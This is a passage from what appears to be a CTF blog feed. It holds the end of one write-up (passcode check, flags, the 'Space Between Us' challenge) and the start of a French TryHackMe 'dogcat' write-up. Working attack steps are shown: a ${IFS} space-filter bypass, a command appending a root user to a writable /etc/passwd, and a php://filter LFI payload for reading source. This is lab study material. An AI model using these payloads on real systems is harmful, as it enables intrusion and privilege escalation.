&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;replace&lt;/span&gt;(s, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;replace&lt;/span&gt;(s, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;o&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;replace&lt;/span&gt;(s, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;4&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#a6e22e&#34;&gt;strlen&lt;/span&gt;(s) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;38&lt;/span&gt; )
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;strcmp&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;master locks arent vry strong are they&amp;#34;&lt;/span&gt;, s) )
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#a6e22e&#34;&gt;replace&lt;/span&gt;(s, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;e&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;3&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#a6e22e&#34;&gt;replace&lt;/span&gt;(s, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; &amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;_&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#a6e22e&#34;&gt;replace&lt;/span&gt;(s, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;o&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#a6e22e&#34;&gt;replace&lt;/span&gt;(s, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;4&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#a6e22e&#34;&gt;unlock&lt;/span&gt;(s);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;printf&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Not quite!&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can see that it takes our input, ‚Äúunleetifies‚Äù it (replaces 3 with e, spaces with _, 4 with a and 0 with o), compares it with the passcode and then calls the &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;unlock()&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; function&lt;/p&gt;
&lt;p&gt;So, we just have to run the binary and enter the following passcode:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;m4st3r_l0cks_4r3nt_vry_str0ng_4r3_th3y&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/208268433-7297da21-0953-4a8c-81e1-6db25c4188b4.png&#34; alt=&#34;2022-12-17-231231_758x783_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;flag ‚Üí &lt;strong&gt;flag{264cec034faef71c642de1721ea26b1f}&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;the-space-between-us&#34;&gt;The Space Between Us&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Author: @JohnHammond#6971

I&amp;#39;ve never felt this close to a character before. I hope the feeling is mutual...

Escalate your privileges and retrieve the flag out of root&amp;#39;s home directory.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;When we connect to the machine using netcat, we see that every spaces are filtered in our commands:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/208268435-08961a13-3c6a-4d94-a172-d356d9fcb606.png&#34; alt=&#34;2022-12-17-231433_634x459_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;So, the first step is finding a way to execute commands with spaces&lt;/p&gt;
&lt;p&gt;And to do that, there is an environment variable that exists by default in linux: &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;${IFS}&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;For example, to execute &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;ls -la&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;, we will have to write &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;ls${IFS}-la&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Now that we know this, we can list the content of the folder&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/208268441-0a174e6c-90e2-42cd-b40b-5cd5c1d450ae.png&#34; alt=&#34;2022-12-17-231629_567x259_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;We can see a &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;README.md&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; file, let‚Äôs take a look at it&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/208268447-6667c331-b64d-4329-8d76-ee4f4a9c82f4.png&#34; alt=&#34;2022-12-17-231714_494x197_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;It says that there is a misconfiguration in the filesystem, so we can start taking a look around&lt;/p&gt;
&lt;p&gt;After spending a good hour enumerating every files and their permissions, I see that the &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;/etc/passwd&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; is writable&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/208268453-d9048712-2fc6-4709-9d19-1e8b10cb6e3f.png&#34; alt=&#34;2022-12-17-231901_556x99_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;We are going to add a user to the file, who‚Äôs home directory will be &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;/root&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;First, we need to generate a password hash for the user&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è openssl passwd hack&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Then, add a new line to the &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;passwd&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; file using echo (because nano &amp;amp; vim arent working)&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è echo${IFS}&amp;quot;hacker:ZUVbo0DtkXUXw:0:0:root:/root:/bin/bash&amp;quot;&amp;gt;&amp;gt;/etc/passwd&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/208268459-7a396236-e4e3-4cbe-b17a-b272225c6241.png&#34; alt=&#34;2022-12-17-182345_1888x1032_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;Of course, we still can‚Äôt use spaces so we use &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;${IFS}&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Now, we can read &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;/root/flag.txt&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; as this user using &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;su&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è echo${IFS}hack${IFS}|${IFS}su${IFS}-${IFS}hacker${IFS}-c${IFS}&amp;quot;cat&amp;lt;/root/flag.txt‚Äù&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/208268465-f4b92ff5-3ff2-47fa-b4f0-6f06026ff481.png&#34; alt=&#34;2022-12-17-182532_1888x1032_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;flag ‚Üí &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;flag{59af40c07bc6f02b457aa4c15543da2d}&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;I globally liked this CTF, there were some very interesting rooms and I learned new things so that‚Äôs a W&lt;/p&gt;
&lt;p&gt;Thanks to everyone who participated and to my tm8 b0unce&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/208268486-dbb01cf2-d9fe-4558-ba25-322bd76d1aad.png&#34; alt=&#34;certificate&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/208268490-01653d9d-3f6c-4d60-a146-08cdf933b7cb.png&#34; alt=&#34;2022-12-17-232956_1888x1032_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;1479 pts - 53/1658 (my username at the time was 99makarov)&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>TryHackMe - dogcat - Medium</title>
      <link>/posts/thm-dogcat/</link>
      <pubDate>Thu, 22 Dec 2022 00:00:00 +0000</pubDate>
      
      <guid>/posts/thm-dogcat/</guid>
      <description>dogcat.thm Difficulty: Medium OS: Linux Description: I made a website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container. Link: https://tryhackme.com/room/dogcat Note La room est pas mal, la partie privesc est beaucoup plus facile que le foothold qui m‚Äôa bien fait gal√©rer puisque je faisais n‚Äôimporte quoi, et √† l‚Äôinverse pour la docker escape, on doit vraiment chercher pour trouver le script backup.</description>
      <content>&lt;h1 id=&#34;dogcatthm&#34;&gt;dogcat.thm&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Difficulty: Medium&lt;/li&gt;
&lt;li&gt;OS: Linux&lt;/li&gt;
&lt;li&gt;Description: &lt;code&gt;I made a website where you can look at pictures of dogs and/or cats! Exploit a PHP application via LFI and break out of a docker container.&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Link: &lt;a href=&#34;https://tryhackme.com/room/dogcat&#34;&gt;https://tryhackme.com/room/dogcat&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;note&#34;&gt;Note&lt;/h1&gt;
&lt;p&gt;La room est pas mal, la partie privesc est beaucoup plus facile que le foothold qui m‚Äôa bien fait gal√©rer puisque je faisais n‚Äôimporte quoi, et √† l‚Äôinverse pour la docker escape, on doit vraiment chercher pour trouver le script backup.sh‚Ä¶&lt;/p&gt;
&lt;h1 id=&#34;recon&#34;&gt;Recon&lt;/h1&gt;
&lt;p&gt;On lance:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è nmap -A dogcat.thm&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/207948122-aec6bdc1-cb0c-4fbe-b137-bee1a341243d.png&#34; alt=&#34;2022-12-15-183118_828x228_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;Rien de vraiment int√©ressant ici&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è dirb http://dogcat.thm&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/207948161-c276e45d-453c-468a-bafd-3cf287db8aad.png&#34; alt=&#34;2022-12-15-184415_930x1026_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;eeeeeeet, rien de vraiment int√©ressant ici non pus&lt;/p&gt;
&lt;h1 id=&#34;foothold&#34;&gt;Foothold&lt;/h1&gt;
&lt;p&gt;On va donc se concentrer sur le site en lui m√™me:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/207948180-ba53a656-3fb1-4d6d-91ab-9934d7928771.png&#34; alt=&#34;2022-12-15-182558_400x276_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;Deux boutons, si on clique sur le bouton &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;cat&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; par exemple, on est redirig√© vers &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;dogcat.thm/?view=cat&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;On voit la LFI venir de loin, on tente donc de modifier le param√®tre view pour y mettre cat.php&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/207948207-65d07392-fab7-45fc-8704-faf35f70668a.png&#34; alt=&#34;2022-12-15-183301_914x454_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;Ceci cr√©e une erreur mais nous confirme que le site est bien vuln√©rable √† une LFI sur ce param√®tre&lt;/p&gt;
&lt;p&gt;Cela nous indique aussi qu‚Äôil ajoute l‚Äôextention .php √† la fin du param√®tre, ce qui ne nous arrange pas&lt;/p&gt;
&lt;p&gt;Puisqu‚Äôon ne peut lire que des fichiers PHP (√† cause de l‚Äôextention), on peut tenter de lire l‚Äôindex:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è ?view=php://filter/convert.base64-encode/resource=cat/../index&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;On utilise le filtre base64 pour lire le fichier index.php (on ne pr√©cise pas le .php puisque le backend va le rajouter tout seul)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/207948338-68202432-02af-4e33-93e0-80daeaadfb78.png&#34; alt=&#34;2022-12-15-183822_1035x369_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;Et le site nous retourne bel et bien le code de l‚Äôindex en base64&lt;/p&gt;
&lt;p&gt;En le d√©codant, on a ceci:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;!&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;DOCTYPE&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;HTML&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;html&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;head&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;title&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;dogcat&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;title&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;link&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;rel&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;stylesheet&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;text/css&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;href&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/style.css&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;head&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;body&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;h1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;dogcat&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;h1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;gallery&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;of&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;various&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;dogs&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;cats&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;div&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;h2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;What&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;would&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;you&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;like&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;to&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;see&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;?&amp;lt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;h2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
